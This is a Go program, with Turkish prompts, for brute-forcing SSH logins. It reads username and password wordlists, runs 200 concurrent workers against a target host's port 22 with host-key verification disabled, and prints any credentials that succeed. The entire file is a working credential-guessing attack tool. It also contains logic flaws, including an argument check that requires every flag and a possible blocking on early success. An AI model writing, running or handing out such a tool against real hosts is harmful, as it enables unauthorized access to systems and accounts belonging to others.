package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"sync"

	"golang.org/x/crypto/ssh"
)

var (
	targetHost string
	username   string
	userFile   string
	password   string
	passFile   string
)

func init() {
	flag.StringVar(&targetHost, "h", "", "Hedef IP adresi veya hostname belirtiniz.")
	flag.StringVar(&username, "u", "", "Bir tane kullanıcı adı belirtiniz.")
	flag.StringVar(&userFile, "U", "", "Kullanıcı adları için kullanılacak wordlist dosyasını belirtiniz.")
	flag.StringVar(&password, "p", "", "Bir tane şifre belirtiniz.")
	flag.StringVar(&passFile, "P", "", "Şifreler için kullanılacak wordlist dosyasını belirtiniz.")
}

func parseArgs() {
	flag.Parse()

	if (targetHost == "") || (username == "") || (userFile == "") || (password == "") || (passFile == "") {
		fmt.Println("HATA: Gereken parametreler eksik girildi.")
		flag.Usage()
		os.Exit(1)
	}
}

func loadList(filename string) ([]string, error) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("Wordlist dosyası okunamadı: %v", err)
	}
	return strings.Split(string(data), "\n"), nil
}

func trySSH(host string, username string, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", host+":22", config)
	if err != nil {
		return false
	}
	client.Close()
	return true
}

func worker(target string, taskQ <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for task := range taskQ {
		parts := strings.Split(task, ":")
		if len(parts) != 2 {
			continue
		}
		username := parts[0]
		password := parts[1]
		if trySSH(target, username, password) {

			fmt.Printf("BAŞARILI: Geöerli kimlik bilgileri bulundu: %s, Sifre:%s\n", username, password)
			return
		}
	}
}

func main() {
	parseArgs()
	var users []string
	var passwords []string
	var err error
	if userFile != "" {
		users, err = loadList(userFile)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		users = append(users, username)
	}
	if passFile != "" {
		passwords, err = loadList(passFile)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		passwords = append(passwords, password)
	}
	var taskQ = make(chan string, 100)
	var wg sync.WaitGroup

	for i := 0; i < 200; i++ {
		wg.Add(1)
		go worker(targetHost, taskQ, &wg)
	}

	for _, user := range users {
		for _, pass := range passwords {
			taskQ <- fmt.Sprintf("%s:%s", user, pass)
		}

	}

	close(taskQ)
	wg.Wait()
}
